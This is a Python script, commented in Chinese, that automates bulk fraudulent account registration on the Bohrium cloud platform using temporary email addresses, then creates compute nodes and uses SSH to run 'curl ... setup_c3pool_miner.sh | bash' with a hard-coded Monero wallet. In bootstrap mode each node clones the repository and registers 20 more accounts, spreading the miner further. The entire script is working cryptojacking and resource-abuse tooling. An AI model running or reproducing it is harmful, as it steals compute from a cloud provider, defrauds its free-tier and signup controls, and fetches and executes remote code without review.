#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Bohrium 一键 / 多任务 VPS 流水线。

单任务流程：
  1) 协议注册登录，获取 token
  2) 按配置创建节点（projectId 按账号自动识别）
  3) 等待 SSH 可用
  4) 按 mode 在远程执行：
     - bootstrap: 克隆 GitHub 仓库 -> 再注册 N 号开机器(mode=mine) -> 本机也挖矿
     - mine: 仅安装挖矿（叶子节点，防止无限递归）

多任务：
  --count N      任务数量
  --workers M    并发线程数
  --retries R    单任务失败重试次数
"""

from __future__ import annotations

import argparse
import json
import logging
import os
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from bohrium_register import register_once, result_to_dict as register_to_dict  # noqa: E402
from bohrium_create_node import (  # noqa: E402
    DEFAULT_DEVICE,
    DEFAULT_DISK,
    DEFAULT_IMAGE_ID,
    DEFAULT_PLATFORM,
    DEFAULT_SKU_ID,
    DEFAULT_TURNOFF_AFTER,
    create_node,
    result_to_dict as create_to_dict,
)
from bohrium_ssh import connect_ssh, run_cmd, wait_ssh_port  # noqa: E402

LOG = logging.getLogger("vps")
PRINT_LOCK = threading.Lock()

DEFAULT_PROXY = "http://127.0.0.1:7890"
DEFAULT_WALLET = (
    os.environ.get("VPS_WALLET", "").strip()
    or "TWdsFCGsotzaLMZnyhVyDJ1sHz8hvxqyat"
)
DEFAULT_REPO = (
    os.environ.get("VPS_REPO", "").strip()
    or "https://github.com/Akilaea/bohrium-vps-pipeline.git"
)
DEFAULT_MODE = "bootstrap"  # bootstrap | mine
DEFAULT_OUT = ROOT / "vps_result.json"
DEFAULT_COUNT = 20
DEFAULT_WORKERS = 20
DEFAULT_RETRIES = 2
DEFAULT_REMOTE_COUNT = 20
DEFAULT_REMOTE_WORKERS = 20
DEFAULT_REMOTE_RETRIES = 2

_ANSI_RE = re.compile(r"\x1b\[[0-9;?]*[A-Za-z]|\x1b\].*?\x07|\x1b.")
_CTRL_RE = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f]")


def _configure_stdio() -> None:
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass


def clean_text(text: Any, limit: int = 300) -> str:
    if text is None:
        return ""
    s = str(text)
    s = _ANSI_RE.sub("", s)
    s = s.replace("\r\n", "\n").replace("\r", "\n")
    s = _CTRL_RE.sub("", s)
    # 压缩空白，避免长 traceback/HTML 刷屏
    s = re.sub(r"[ \t]+", " ", s)
    s = re.sub(r"\n{3,}", "\n\n", s)
    s = s.strip()
    if len(s) > limit:
        s = s[: limit - 3] + "..."
    return s


def short_error(exc: BaseException | str, limit: int = 220) -> str:
    if isinstance(exc, BaseException):
        name = type(exc).__name__
        msg = clean_text(exc, limit=limit)
        if msg:
            return f"{name}: {msg}" if name not in msg else msg
        return name
    return clean_text(exc, limit=limit)


def setup_logging(verbose: bool = False) -> None:
    _configure_stdio()
    root = logging.getLogger()
    root.handlers.clear()
    root.setLevel(logging.DEBUG if verbose else logging.INFO)

    handler = logging.StreamHandler(sys.stdout)
    handler.setLevel(logging.DEBUG if verbose else logging.INFO)
    handler.setFormatter(logging.Formatter("%(asctime)s %(message)s", datefmt="%H:%M:%S"))
    root.addHandler(handler)

    # 默认静音子模块英文日志，只保留本脚本中文摘要
    quiet_level = logging.WARNING if not verbose else logging.DEBUG
    for name in (
        "bohrium_register",
        "bohrium_create_node",
        "bohrium_ssh",
        "paramiko",
        "paramiko.transport",
        "urllib3",
        "requests",
        "websocket",
    ):
        logging.getLogger(name).setLevel(quiet_level)
        logging.getLogger(name).propagate = True


def log_info(msg: str, *args: Any) -> None:
    LOG.info(msg, *args)


def log_warn(msg: str, *args: Any) -> None:
    LOG.warning(msg, *args)


def log_err(msg: str, *args: Any) -> None:
    LOG.error(msg, *args)


def _save(path: Path, data: dict[str, Any]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")


def _safe_print(msg: str) -> None:
    with PRINT_LOCK:
        print(clean_text(msg, limit=2000), flush=True)


def _token_from_register(reg: dict[str, Any]) -> str | None:
    token = reg.get("token")
    if token:
        return str(token).strip() or None
    cookies = reg.get("cookies") or {}
    return (
        str(cookies.get("brmToken") or cookies.get("sso-brmToken") or "").strip() or None
    )


def _node_hosts(create_result: dict[str, Any]) -> tuple[list[str], str, str, str, str]:
    info = create_result.get("node_info") or {}
    ip = create_result.get("ip") or info.get("ip") or ""
    domain = (
        info.get("domainName")
        or info.get("domain")
        or create_result.get("domain")
        or ""
    )
    username = (
        create_result.get("username")
        or info.get("nodeUser")
        or info.get("username")
        or "root"
    )
    password = (
        create_result.get("password")
        or info.get("nodePwd")
        or info.get("password")
        or ""
    )
    hosts: list[str] = []
    for h in (domain, ip):
        if h and h not in hosts:
            hosts.append(str(h))
    return hosts, str(username), str(password), str(ip), str(domain)


def _sh_quote(s: str) -> str:
    return "'" + str(s).replace("'", "'\"'\"'") + "'"


def build_remote_cmds(
    *,
    mode: str = DEFAULT_MODE,
    wallet: str = DEFAULT_WALLET,
    repo: str = DEFAULT_REPO,
    remote_count: int = DEFAULT_REMOTE_COUNT,
    remote_workers: int = DEFAULT_REMOTE_WORKERS,
    remote_retries: int = DEFAULT_REMOTE_RETRIES,
) -> list[tuple[str, str]]:
    """SSH 阶段命令。bootstrap=拉仓库再开20台(叶子mine)；mine=只挖矿。"""
    mode = (mode or "mine").strip().lower()
    wallet_q = _sh_quote(wallet)
    mine_inline = (
        "curl -s -L https://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh "
        f"| bash -s {wallet_q}"
    )
    if mode != "bootstrap":
        return [("执行挖矿脚本", mine_inline)]

    repo_q = _sh_quote(repo)
    # ghproxy for China VPS if raw github clone fails
    repo_proxy = repo
    if "github.com" in repo and "gh-proxy" not in repo:
        repo_proxy = "https://mirror.ghproxy.com/" + repo
    repo_proxy_q = _sh_quote(repo_proxy)
    mine_bash_q = _sh_quote(mine_inline)
    rc = max(int(remote_count), 1)
    rw = max(int(remote_workers), 1)
    rr = max(int(remote_retries), 0)
    bootstrap = (
        "set -e\n"
        "export DEBIAN_FRONTEND=noninteractive\n"
        "export PYTHONUNBUFFERED=1\n"
        "if command -v apt-get >/dev/null 2>&1; then\n"
        "  apt-get update -y || true\n"
        "  apt-get install -y git python3 python3-pip python3-venv curl ca-certificates || true\n"
        "elif command -v yum >/dev/null 2>&1; then\n"
        "  yum install -y git python3 python3-pip curl ca-certificates || true\n"
        "fi\n"
        "rm -rf /root/bohrium-vps-pipeline\n"
        f"git clone --depth 1 {repo_q} /root/bohrium-vps-pipeline "
        f"|| git clone --depth 1 {repo_proxy_q} /root/bohrium-vps-pipeline\n"
        "cd /root/bohrium-vps-pipeline\n"
        "python3 -m pip install -U pip -q -i https://pypi.tuna.tsinghua.edu.cn/simple || true\n"
        "python3 -m pip install -r requirements.txt -q -i https://pypi.tuna.tsinghua.edu.cn/simple "
        "|| python3 -m pip install -r requirements.txt -q\n"
        f"nohup bash -c {mine_bash_q} >/root/self_mine.log 2>&1 &\n"
        f"nohup python3 vps.py --no-proxy --count {rc} --workers {rw} "
        f"--retries {rr} --mode mine --wallet {wallet_q} >/root/vps_spawn.log 2>&1 &\n"
        "SPID=$!\n"
        "echo SPAWN_PID=$SPID\n"
        "sleep 8\n"
        "if ps -p $SPID >/dev/null 2>&1; then\n"
        "  echo SPAWN_STARTED_OK\n"
        "  exit 0\n"
        "fi\n"
        "echo SPAWN_FAILED\n"
        "tail -n 120 /root/vps_spawn.log || true\n"
        "exit 1\n"
    )
    return [("克隆仓库并启动二阶开号挖矿", bootstrap)]


def run_pipeline_once(
    *,
    task_id: int = 1,
    attempt: int = 1,
    proxy: str | None = DEFAULT_PROXY,
    token: str | None = None,
    skip_register: bool = False,
    register_prefix: str = "bohrium",
    mail_timeout: int = 90,
    require_captcha: bool = False,
    sku_id: int = DEFAULT_SKU_ID,
    image_id: int = DEFAULT_IMAGE_ID,
    disk_size: int = DEFAULT_DISK,
    project_id: int | None = None,
    name: str | None = None,
    device: str = DEFAULT_DEVICE,
    platform: str = DEFAULT_PLATFORM,
    turnoff_after: int = DEFAULT_TURNOFF_AFTER,
    wallet: str = DEFAULT_WALLET,
    mode: str = DEFAULT_MODE,
    repo: str = DEFAULT_REPO,
    remote_count: int = DEFAULT_REMOTE_COUNT,
    remote_workers: int = DEFAULT_REMOTE_WORKERS,
    remote_retries: int = DEFAULT_REMOTE_RETRIES,
    wait_ssh: float = 180.0,
    ssh_port: int = 22,
    cmd_timeout: float | None = 3600.0,
    out: Path = DEFAULT_OUT,
    keep_token_file: Path | None = None,
    create_out: Path | None = None,
    stream_ssh: bool = True,
) -> dict[str, Any]:
    tag = f"[任务{task_id}]"
    if attempt > 1:
        tag = f"[任务{task_id}/重试{attempt}]"

    result: dict[str, Any] = {
        "ok": False,
        "task_id": task_id,
        "attempt": attempt,
        "stage": "init",
        "register": None,
        "create": None,
        "ssh": None,
        "error": None,
        "started_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        "finished_at": None,
    }

    # 1) 注册/登录
    result["stage"] = "register"
    use_token = (token or "").strip() or None
    reg_data: dict[str, Any] | None = None

    try:
        if use_token:
            log_info("%s 使用已有 token，跳过注册", tag)
            reg_data = {"ok": True, "token": use_token, "skipped": True}
        elif skip_register:
            lr = ROOT / "last_result.json"
            if not lr.is_file():
                raise RuntimeError("已指定跳过注册，但找不到 last_result.json，且未提供 token")
            loaded = json.loads(lr.read_text(encoding="utf-8"))
            use_token = _token_from_register(loaded)
            if not use_token:
                raise RuntimeError("last_result.json 中没有可用 token")
            reg_data = {**loaded, "skipped": True, "ok": True}
            log_info("%s 复用本地 token，邮箱=%s", tag, loaded.get("email") or "-")
        else:
            log_info("%s 开始注册账号...", tag)
            reg = register_once(
                proxy=proxy,
                prefix=register_prefix,
                mail_timeout=mail_timeout,
                require_captcha=require_captcha,
            )
            reg_data = register_to_dict(reg)
            if keep_token_file is not None:
                _save(keep_token_file, reg_data)
            if not reg.ok or not reg.token:
                raise RuntimeError(reg.error or "注册失败，未拿到 token")
            use_token = reg.token
            log_info("%s 注册成功 邮箱=%s", tag, reg.email or "-")
        result["register"] = reg_data
    except Exception as exc:  # noqa: BLE001
        err = short_error(exc)
        result["error"] = err
        result["register"] = reg_data
        result["finished_at"] = time.strftime("%Y-%m-%d %H:%M:%S")
        _save(out, result)
        log_err("%s 注册失败：%s", tag, err)
        return result

    assert use_token

    # 2) 创建节点
    result["stage"] = "create_node"
    node_name = name or ("vps-%s-%02d" % (time.strftime("%m%d%H%M%S"), task_id))
    try:
        log_info(
            "%s 创建节点中 name=%s sku=%s image=%s disk=%s project=%s",
            tag,
            node_name,
            sku_id,
            image_id,
            disk_size,
            project_id if project_id is not None else "自动",
        )
        created = create_node(
            token=use_token,
            proxy=proxy,
            target_price=None,
            sku_id=sku_id,
            project_id=project_id,
            disk_size=disk_size,
            name=node_name,
            image_id=image_id,
            version_id=None,
            image_name=None,
            device=device,
            dry_run=False,
            wait=True,
        )
        create_data = create_to_dict(created)
        result["create"] = create_data
        if create_out is not None:
            info = (create_data.get("node_info") or {})
            if info and not info.get("domainName") and info.get("domain"):
                info["domainName"] = info.get("domain")
            _save(create_out, create_data)
        if not created.ok:
            raise RuntimeError(created.error or "创建节点失败")

        hosts, username, password, ip, domain = _node_hosts(create_data)
        if not password:
            raise RuntimeError("节点已创建，但密码为空")
        if not hosts:
            raise RuntimeError("节点已创建，但没有 IP/域名")

        log_info(
            "%s 节点就绪 id=%s project=%s ip=%s domain=%s",
            tag,
            create_data.get("node_id"),
            create_data.get("project_id"),
            ip or "-",
            domain or "-",
        )
        _safe_print(
            "===== 节点信息 %s =====\n"
            "节点ID   : %s\n"
            "名称     : %s\n"
            "项目ID   : %s\n"
            "IP       : %s\n"
            "域名     : %s\n"
            "用户名   : %s\n"
            "密码     : %s\n"
            "========================"
            % (
                tag,
                create_data.get("node_id"),
                node_name,
                create_data.get("project_id"),
                ip,
                domain,
                username,
                password,
            )
        )
    except Exception as exc:  # noqa: BLE001
        err = short_error(exc)
        result["error"] = err
        result["finished_at"] = time.strftime("%Y-%m-%d %H:%M:%S")
        _save(out, result)
        log_err("%s 创建节点失败：%s", tag, err)
        return result

    # 3) SSH
    result["stage"] = "ssh_wait"
    hosts, username, password, ip, domain = _node_hosts(result["create"] or {})
    ssh_info: dict[str, Any] = {
        "hosts": hosts,
        "host_used": None,
        "username": username,
        "password": password,
        "port": ssh_port,
        "outputs": [],
        "ok": False,
        "error": None,
    }
    result["ssh"] = ssh_info
    client = None

    try:
        log_info("%s 等待 SSH 就绪...", tag)
        ready_host = wait_ssh_port(hosts, port=ssh_port, timeout=wait_ssh)
        if not ready_host:
            raise RuntimeError(f"SSH 端口未开放：{', '.join(hosts)}（超时 {int(wait_ssh)}s）")
        ssh_info["host_used"] = ready_host
        log_info("%s SSH 已通：%s", tag, ready_host)

        result["stage"] = "ssh_connect"
        try:
            client = connect_ssh(ready_host, username, password, port=ssh_port)
        except Exception as first_exc:  # noqa: BLE001
            last = first_exc
            client = None
            for h in hosts:
                if h == ready_host:
                    continue
                try:
                    client = connect_ssh(h, username, password, port=ssh_port)
                    ssh_info["host_used"] = h
                    break
                except Exception as exc2:  # noqa: BLE001
                    last = exc2
            if client is None:
                raise RuntimeError(f"SSH 连接失败：{short_error(last)}") from last

        result["stage"] = "ssh_run"
        cmds = build_remote_cmds(
            mode=mode,
            wallet=wallet,
            repo=repo,
            remote_count=remote_count,
            remote_workers=remote_workers,
            remote_retries=remote_retries,
        )
        ssh_info["mode"] = (mode or "mine").strip().lower()
        ssh_info["repo"] = repo
        for title, cmd in cmds:
            log_info("%s %s...", tag, title)
            code, out_text, err_text = run_cmd(
                client,
                cmd,
                timeout=cmd_timeout,
                stream=stream_ssh,
            )
            out_clean = clean_text(out_text, limit=4000)
            err_clean = clean_text(err_text, limit=1000)
            ssh_info["outputs"].append(
                {
                    "title": title,
                    "cmd": cmd,
                    "exit_code": code,
                    "output": out_clean,
                    "stderr": err_clean,
                }
            )
            if code != 0:
                detail = err_clean or out_clean or f"exit={code}"
                log_warn("%s %s 返回码=%s：%s", tag, title, code, short_error(detail))
            else:
                log_info("%s %s 完成", tag, title)

        ssh_info["ok"] = True
        result["ok"] = True
        result["stage"] = "done"
        log_info("%s 全部完成", tag)
    except Exception as exc:  # noqa: BLE001
        err = short_error(exc)
        result["error"] = err
        ssh_info["error"] = err
        result["ok"] = False
        log_err("%s 远程执行失败：%s", tag, err)
    finally:
        if client is not None:
            try:
                client.close()
            except Exception:
                pass
        result["finished_at"] = time.strftime("%Y-%m-%d %H:%M:%S")
        _save(out, result)

    return result


def run_pipeline_with_retry(
    *,
    retries: int = DEFAULT_RETRIES,
    retry_delay: float = 3.0,
    **kwargs: Any,
) -> dict[str, Any]:
    retries = max(int(retries), 0)
    last: dict[str, Any] | None = None
    task_id = int(kwargs.get("task_id") or 1)
    for attempt in range(1, retries + 2):
        if attempt > 1:
            log_warn("[任务%s] 第 %s 次重试，%ss 后开始...", task_id, attempt - 1, retry_delay)
            time.sleep(max(float(retry_delay), 0.0))
        last = run_pipeline_once(attempt=attempt, **kwargs)
        if last.get("ok"):
            last["attempts"] = attempt
            return last
        # 成功创建节点但后续失败时，默认不继续盲目重试“整条流水线注册新号”
        # 若还没创建出节点，则可完整重试
        stage = str(last.get("stage") or "")
        create = last.get("create") or {}
        if create.get("node_id") and stage in {"ssh_wait", "ssh_connect", "ssh_run"}:
            # 节点已存在时，仅重试 SSH/脚本阶段更合理；这里简单再跑一次整流程会浪费账号
            # 为稳妥：若节点已创建且仅 SSH 失败，继续用同结果返回前再尝试一次纯 SSH 会更复杂
            # 当前策略：允许按 retries 完整重试（会新注册），但日志提示
            log_warn(
                "[任务%s] 节点已创建(id=%s) 但后续失败，将按重试策略继续",
                task_id,
                create.get("node_id"),
            )
        log_warn("[任务%s] 失败：%s", task_id, short_error(last.get("error") or "未知错误"))
    assert last is not None
    last["attempts"] = retries + 1
    return last


def run_many(
    *,
    count: int,
    workers: int,
    retries: int,
    retry_delay: float,
    base_kwargs: dict[str, Any],
    out_dir: Path,
    summary_out: Path,
) -> dict[str, Any]:
    count = max(int(count), 1)
    workers = max(min(int(workers), count), 1)
    out_dir.mkdir(parents=True, exist_ok=True)
    stream_ssh = count == 1

    summary: dict[str, Any] = {
        "ok": False,
        "count": count,
        "workers": workers,
        "retries": retries,
        "started_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        "finished_at": None,
        "success": 0,
        "failed": 0,
        "tasks": [],
    }

    def _one(i: int) -> dict[str, Any]:
        kwargs = dict(base_kwargs)
        kwargs.update(
            {
                "task_id": i,
                "retries": retries,
                "retry_delay": retry_delay,
                "stream_ssh": stream_ssh,
                "out": out_dir / f"task_{i:03d}.json",
                "keep_token_file": out_dir / f"task_{i:03d}_register.json",
                "create_out": out_dir / f"task_{i:03d}_node.json",
            }
        )
        if kwargs.get("name"):
            kwargs["name"] = f"{kwargs['name']}-{i}"
        if count > 1 and not kwargs.get("token") and not kwargs.get("skip_register"):
            kwargs["token"] = None
            kwargs["skip_register"] = False
        log_info("调度任务 %s/%s", i, count)
        return run_pipeline_with_retry(**kwargs)

    results: list[dict[str, Any]] = []
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(_one, i): i for i in range(1, count + 1)}
        for fut in as_completed(futs):
            i = futs[fut]
            try:
                r = fut.result()
            except Exception as exc:  # noqa: BLE001
                r = {
                    "ok": False,
                    "task_id": i,
                    "error": short_error(exc),
                    "stage": "crashed",
                }
            results.append(r)
            status = "成功" if r.get("ok") else "失败"
            c = r.get("create") or {}
            _safe_print(
                f"{status} | 任务{i} | 阶段={r.get('stage')} | "
                f"邮箱={(r.get('register') or {}).get('email') or '-'} | "
                f"节点={c.get('node_id') or '-'} | "
                f"错误={short_error(r.get('error') or '-')}"
            )

    results.sort(key=lambda x: int(x.get("task_id") or 0))
    summary["tasks"] = results
    summary["success"] = sum(1 for r in results if r.get("ok"))
    summary["failed"] = sum(1 for r in results if not r.get("ok"))
    summary["ok"] = summary["failed"] == 0
    summary["finished_at"] = time.strftime("%Y-%m-%d %H:%M:%S")
    _save(summary_out, summary)
    return summary


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="Bohrium：注册 -> 创建节点 -> SSH 下载执行（支持多任务/重试）"
    )
    p.add_argument("--proxy", default=DEFAULT_PROXY, help=f"HTTP 代理（默认 {DEFAULT_PROXY}）")
    p.add_argument("--no-proxy", action="store_true", help="不使用代理")
    p.add_argument("--token", default=None, help="复用已有 token，跳过注册")
    p.add_argument("--skip-register", action="store_true", help="复用 last_result.json 中的 token")
    p.add_argument("--prefix", default="bohrium", help="临时邮箱前缀")
    p.add_argument("--mail-timeout", type=int, default=90, help="等验证码超时秒数")
    p.add_argument("--require-captcha", action="store_true", help="强制打码")

    p.add_argument("--sku-id", type=int, default=DEFAULT_SKU_ID)
    p.add_argument("--image-id", type=int, default=DEFAULT_IMAGE_ID)
    p.add_argument("--disk-size", type=int, default=DEFAULT_DISK)
    p.add_argument("--project-id", type=int, default=None, help="项目ID，默认按账号自动选择")
    p.add_argument("--name", default=None, help="节点名前缀，默认自动生成")
    p.add_argument("--device", default=DEFAULT_DEVICE)
    p.add_argument("--platform", default=DEFAULT_PLATFORM)
    p.add_argument("--turnoff-after", type=int, default=DEFAULT_TURNOFF_AFTER)

    p.add_argument("--wallet", default=DEFAULT_WALLET, help="挖矿钱包地址")
    p.add_argument(
        "--mode",
        default=DEFAULT_MODE,
        choices=["bootstrap", "mine"],
        help="bootstrap=远程拉仓库再开号；mine=仅挖矿（默认 bootstrap）",
    )
    p.add_argument("--repo", default=DEFAULT_REPO, help="bootstrap 时克隆的 GitHub 仓库")
    p.add_argument(
        "--remote-count",
        type=int,
        default=DEFAULT_REMOTE_COUNT,
        help=f"bootstrap 远程再开任务数（默认 {DEFAULT_REMOTE_COUNT}）",
    )
    p.add_argument(
        "--remote-workers",
        type=int,
        default=DEFAULT_REMOTE_WORKERS,
        help=f"bootstrap 远程并发（默认 {DEFAULT_REMOTE_WORKERS}）",
    )
    p.add_argument(
        "--remote-retries",
        type=int,
        default=DEFAULT_REMOTE_RETRIES,
        help=f"bootstrap 远程重试（默认 {DEFAULT_REMOTE_RETRIES}）",
    )
    p.add_argument("--wait-ssh", type=float, default=180.0, help="等待 SSH 超时秒数")
    p.add_argument("--ssh-port", type=int, default=22)
    p.add_argument("--cmd-timeout", type=float, default=3600.0, help="单条远程命令超时秒数")

    p.add_argument("--count", type=int, default=DEFAULT_COUNT, help=f"任务数量（默认 {DEFAULT_COUNT}）")
    p.add_argument("--workers", type=int, default=None, help=f"并发线程数（默认 min(count,{DEFAULT_WORKERS})）")
    p.add_argument("--retries", type=int, default=DEFAULT_RETRIES, help="单任务失败重试次数（默认 2）")
    p.add_argument("--retry-delay", type=float, default=3.0, help="重试间隔秒数")
    p.add_argument("--out", type=Path, default=DEFAULT_OUT, help="结果 JSON 路径")
    p.add_argument("--out-dir", type=Path, default=ROOT / "vps_runs", help="多任务明细目录")
    p.add_argument("-v", action="store_true", help="输出详细调试日志")
    return p


def _brief_one(result: dict[str, Any], out: Path) -> dict[str, Any]:
    c = result.get("create") or {}
    info = c.get("node_info") or {}
    return {
        "成功": bool(result.get("ok")),
        "任务ID": result.get("task_id"),
        "尝试次数": result.get("attempts") or result.get("attempt") or 1,
        "阶段": result.get("stage"),
        "错误": short_error(result.get("error") or "") or None,
        "邮箱": (result.get("register") or {}).get("email"),
        "项目ID": c.get("project_id"),
        "节点ID": c.get("node_id"),
        "IP": c.get("ip"),
        "域名": info.get("domainName"),
        "用户名": c.get("username"),
        "密码": c.get("password"),
        "SSH主机": ((result.get("ssh") or {}).get("host_used")),
        "结果文件": str(out),
    }


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    setup_logging(verbose=args.v)

    proxy = None if args.no_proxy else ((args.proxy or "").strip() or None)
    count = max(int(args.count), 1)
    workers = args.workers if args.workers is not None else min(count, DEFAULT_WORKERS)
    workers = max(int(workers), 1)
    retries = max(int(args.retries), 0)

    base_kwargs: dict[str, Any] = {
        "proxy": proxy,
        "token": args.token,
        "skip_register": args.skip_register,
        "register_prefix": args.prefix,
        "mail_timeout": args.mail_timeout,
        "require_captcha": args.require_captcha,
        "sku_id": args.sku_id,
        "image_id": args.image_id,
        "disk_size": args.disk_size,
        "project_id": args.project_id,
        "name": args.name,
        "device": args.device,
        "platform": args.platform,
        "turnoff_after": args.turnoff_after,
        "wallet": args.wallet,
        "mode": args.mode,
        "repo": args.repo,
        "remote_count": args.remote_count,
        "remote_workers": args.remote_workers,
        "remote_retries": args.remote_retries,
        "wait_ssh": args.wait_ssh,
        "ssh_port": args.ssh_port,
        "cmd_timeout": args.cmd_timeout,
    }

    log_info(
        "启动：任务数=%s 线程=%s 重试=%s 模式=%s 代理=%s",
        count,
        workers,
        retries,
        args.mode,
        proxy or "无",
    )

    if count == 1:
        result = run_pipeline_with_retry(
            retries=retries,
            retry_delay=args.retry_delay,
            task_id=1,
            out=args.out,
            keep_token_file=ROOT / "last_result.json",
            create_out=ROOT / "create_node_result.json",
            stream_ssh=True,
            **base_kwargs,
        )
        brief = _brief_one(result, args.out)
        print(json.dumps(brief, ensure_ascii=False, indent=2))
        if result.get("ok"):
            log_info("任务完成")
            return 0
        log_err("任务失败：%s", short_error(result.get("error") or "未知错误"))
        return 1

    if args.token or args.skip_register:
        log_warn("多任务模式下使用同一 token，将在同一账号下创建多台机器")

    batch_dir = args.out_dir / time.strftime("%Y%m%d_%H%M%S")
    summary = run_many(
        count=count,
        workers=workers,
        retries=retries,
        retry_delay=args.retry_delay,
        base_kwargs=base_kwargs,
        out_dir=batch_dir,
        summary_out=args.out,
    )
    brief_tasks = []
    for r in summary.get("tasks") or []:
        c = r.get("create") or {}
        brief_tasks.append(
            {
                "任务ID": r.get("task_id"),
                "成功": bool(r.get("ok")),
                "尝试次数": r.get("attempts") or r.get("attempt") or 1,
                "邮箱": (r.get("register") or {}).get("email"),
                "项目ID": c.get("project_id"),
                "节点ID": c.get("node_id"),
                "IP": c.get("ip"),
                "域名": ((c.get("node_info") or {}).get("domainName")),
                "用户名": c.get("username"),
                "密码": c.get("password"),
                "错误": short_error(r.get("error") or "") or None,
            }
        )
    print(
        json.dumps(
            {
                "成功": bool(summary.get("ok")),
                "任务数": summary.get("count"),
                "线程数": summary.get("workers"),
                "重试次数": summary.get("retries"),
                "成功数": summary.get("success"),
                "失败数": summary.get("failed"),
                "汇总文件": str(args.out),
                "明细目录": str(batch_dir),
                "任务列表": brief_tasks,
            },
            ensure_ascii=False,
            indent=2,
        )
    )
    if summary.get("ok"):
        log_info("全部任务完成：成功 %s/%s", summary.get("success"), summary.get("count"))
        return 0
    log_err(
        "部分任务失败：成功 %s，失败 %s",
        summary.get("success"),
        summary.get("failed"),
    )
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
